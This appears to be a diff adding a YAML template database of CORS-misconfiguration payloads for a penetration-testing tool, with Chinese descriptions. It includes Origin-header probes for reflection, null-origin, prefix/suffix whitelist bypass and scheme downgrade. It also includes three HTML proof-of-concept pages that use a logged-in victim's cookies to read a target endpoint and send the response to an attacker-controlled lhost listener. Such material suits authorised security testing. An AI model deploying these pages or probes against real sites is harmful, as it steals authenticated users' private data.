@@ -1,0 +1,208 @@
+ruleDB: v0.1.0
+# CORS 配置错误模板。这一批要分清**两个半边**，它们的 requires 不一样：
+#
+#   1. 打过去的请求 —— 载荷是那个要填进 Origin 头的值（content_type: raw）。
+#      发出去看响应里的 Access-Control-Allow-Origin 是不是跟着它走。
+#      前提只有 cors-misconfig：没有反射（或没放开任意源）就没有可读的响应。
+#
+#   2. 受害者浏览器里跑的 PoC —— 载荷是一段 HTML（content_type: html）。
+#      托管在 lhost 上、让已登录的受害者打开，才是**能证明漏洞**的东西：
+#      攻击者自己发请求拿不到带会话的响应，必须借受害者的浏览器。
+#      所以除了 cors-misconfig 还要 listener（lhost 上要托页面、还要收外发）。
+#
+# 两边都**不加 outbound**：出网的是受害者的浏览器，不是目标。
+# 也**不加 no-httponly**：这里读的是响应正文，不是 document.cookie，HttpOnly 管不着。
+#
+# 一个词表覆盖不到的浏览器侧限制写在 desc 里：会话 Cookie 若是 SameSite=Lax/Strict，
+# 跨站请求根本带不上它，两种形态都会哑火——这是浏览器的策略，不是目标的属性。
+#
+# 变量 origin / trusted 都不给默认值（契约 3）：漏填时保留占位符字面量，
+# 产出一个明显不可用的串，而不是指向某个真实域名的串。
+# origin 是攻击者控制的域名（evil.com），trusted 是**目标自己的域名**（target.com）——
+# 白名单绕过那两条就是把这两个拼起来的，别填反。
+# 后缀绕过那条的攻击者域名怎么拼（裸标签 eviltarget.com / 完整域名 evil.comtarget.com）
+# 是一组要联合选择的值，落在 bypass 槽位上；目标域名仍然是变量，两个选项共用它。
+
+templates:
+  # ---------------------------------------------------------------- 探测请求（半个）
+
+  - id: cors.generic.probe.origin
+    name: Origin 探测（单源）
+    desc: 填进请求头的 Origin（提交方式选「请求头」、头名填 Origin）再发出去，看响应里的 Access-Control-Allow-Origin 是不是原样回显了它；这条只是探测，回显了也还要看有没有 Access-Control-Allow-Credentials
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    body: "https://<<origin>>"
+    vars: [origin]
+    requires: [cors-misconfig]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.probe.null
+    name: Origin 设为 null
+    desc: "Origin 的取值就是字符串 null，沙箱 iframe（sandbox 不带 allow-same-origin）和 data: URL 页面发出来的都是它；目标把 null 也当合法源时，任意站点都能借沙箱 iframe 读走响应正文，配套的 PoC 见 poc.null_origin"
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    body: "null"
+    vars: []
+    requires: [cors-misconfig]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.probe.prefix
+    name: Origin 前缀匹配绕过
+    desc: 目标把「Origin 以自己域名开头」当合法时用这条；真正的 authority 是后半截那个攻击者域名，trusted 只是它的子域标签，攻击者控制自己域名的 DNS 就成立。目标用的是域名后缀判断时改用 probe.suffix
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    body: "https://<<trusted>>.<<origin>>"
+    vars: [origin, trusted]
+    requires: [cors-misconfig]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.probe.suffix
+    name: Origin 后缀匹配绕过
+    desc: 目标用「Origin 以自己域名结尾」判断时用；两种拼法都满足这种判断，但可注册的域名不一样——裸标签那种注册 eviltarget.com 自己就行，带点的那种要注册 comtarget.com。白名单写成 .target.com（带前导点）的实现两条都拦得住，那种情况换 probe.prefix
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      # 攻击者域名怎么拼与它拼出来的值是一回事，拆成两个槽位用户能拼出对不上的串，
+      # 所以做成字典槽位。目标域名仍然是变量，两个选项共用它。
+      bypass:
+        options:
+          - {id: label, name: "裸标签拼法（eviltarget.com）",        origin: "evil"}
+          - {id: full,  name: "完整域名拼法（evil.comtarget.com）",  origin: "evil.com"}
+        default: label
+    body: "https://<<bypass.origin>><<trusted>>"
+    vars: [trusted]
+    requires: [cors-misconfig]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.probe.simple_request
+    name: 简单请求绕过预检
+    desc: 简单请求不触发预检，Content-Type 只有这三种才算简单请求；目标只在 OPTIONS 预检里校验 Origin、实际请求不校验时，用这条把请求直接打过去。填进请求头的 Content-Type（提交方式选「请求头」）；带自定义头或 Authorization 的请求都不简单，照旧会触发预检
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      ct:
+        options: ["text/plain", "application/x-www-form-urlencoded", "multipart/form-data"]
+        default: "text/plain"
+    body: "<<ct>>"
+    vars: []
+    requires: [cors-misconfig]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.probe.credentials
+    name: 反射 Origin 配凭据的判定清单
+    desc: "这不是打出去的载荷，是判定清单——探测响应里要同时出现这两行才算可利用：只回显 ACAO 而没有 Access-Control-Allow-Credentials: true 时，浏览器不会把带 Cookie 的响应交给 JS。ACAO 写成星号时即使 ACAC 为 true 也会被浏览器拒绝，那种情况改看反射 Origin 的几条"
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    body: |-
+      Access-Control-Allow-Origin: https://<<origin>>
+      Access-Control-Allow-Credentials: true
+    vars: [origin]
+    requires: [cors-misconfig]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- PoC 页面（另半个）
+  # 这三条是要**托管在 lhost 上**、诱使已登录的受害者打开的页面。
+  # 它们自己也发请求，但发请求的是受害者的浏览器，所以带得上目标的会话 Cookie。
+
+  - id: cors.generic.poc.fetch
+    name: PoC 页面（fetch 带凭据读响应）
+    desc: 受害者浏览器里跑的 PoC，不是打给目标的请求。托管在 lhost 上让已登录的受害者打开，credentials 设成 include 才会带上目标的会话 Cookie，前提是目标同时回了反射 Origin 与 ACAC 为 true；响应正文读回来后整体外发到 lhost
+    vuln: [cors]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <script>
+      fetch('https://<<trusted>><<endpoint>>',{credentials:'include'})
+        .then(r=>r.text())
+        .then(t=>fetch('http://<<lhost>>/?d='+encodeURIComponent(t)));
+      </script>
+    vars: [trusted, endpoint, lhost]
+    requires: [cors-misconfig, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.poc.null_origin
+    name: PoC 页面（沙箱 iframe 造 null 源）
+    desc: 目标只把 null 当合法源时用。普通页面发不出 null 这个 Origin，要靠不带 allow-same-origin 的沙箱 iframe——srcdoc 里的文档拿到不透明源，Origin 就是 null。同样要求目标在 ACAC 上回了 true，也受 SameSite 限制
+    vuln: [cors]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://<<trusted>><<endpoint>>',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://<<lhost>>/?d='+encodeURIComponent(t)))</script>"></iframe>
+    vars: [trusted, endpoint, lhost]
+    requires: [cors-misconfig, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.poc.preflight
+    name: PoC 页面（JSON 预检带凭据）
+    desc: 要发 JSON 体的接口用这条；application/json 不在简单请求那三种里，浏览器会先发 OPTIONS 预检，目标必须同时在预检和实际响应上回对 ACAO 与 ACAC 才读得到。只想绕开预检、不要求 JSON 时改用 cors.generic.probe.simple_request
+    vuln: [cors]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      <script>
+      fetch('https://<<trusted>><<endpoint>>',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{}'})
+        .then(r=>r.text())
+        .then(t=>fetch('http://<<lhost>>/?d='+encodeURIComponent(t)));
+      </script>
+    vars: [trusted, endpoint, lhost]
+    requires: [cors-misconfig, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: cors.generic.probe.scheme_downgrade
+    name: Origin 降级到 http
+    desc: 白名单只比对域名、不比对协议时用：白名单里写的是 https://target.com，但 http://target.com 照样被放行。这样任何能在明文 HTTP 上注入的人（同网段的中间人、目标某个 http 子域上的 XSS）就能读到跨站响应——把 https 的防护整个让掉了。这条只探协议有没有参与比对：回显了再换 poc.fetch 那条把请求换成能读数据的 PoC。另外半边的 Access-Control-Allow-Credentials 同样得是 true，否则浏览器不会把带会话的响应交给 JS
+    vuln: [cors]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: http}
+    body: "<<scheme>>://<<trusted>>"
+    vars: [trusted]
+    requires: [cors-misconfig]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
